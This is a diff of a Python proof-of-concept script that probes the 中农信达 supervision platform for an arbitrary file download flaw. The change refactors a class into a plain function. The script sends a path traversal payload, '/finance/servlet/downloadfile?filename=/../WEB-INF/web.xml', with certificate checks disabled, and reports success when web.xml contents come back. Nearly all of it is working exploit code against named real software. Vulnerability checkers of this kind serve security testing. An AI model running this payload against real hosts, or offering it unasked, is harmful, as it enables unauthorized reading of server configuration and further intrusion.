@@ -9,20 +9,13 @@ description: servlet/downloadfile?filename= 文件下载。/hzs/HTMLEditor/uploa
 import sys
 import requests
 import warnings
-  
-
-
-class sinda_downloadfile_download:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['中农信达监察平台任意文件下载','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
         payload = "/finance/servlet/downloadfile?filename=/../WEB-INF/web.xml&userid=/"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"<web-app>" in req.text and r"<servlet-name>" in req.text:
@@ -37,5 +30,4 @@ class sinda_downloadfile_download:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = sinda_downloadfile_download(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
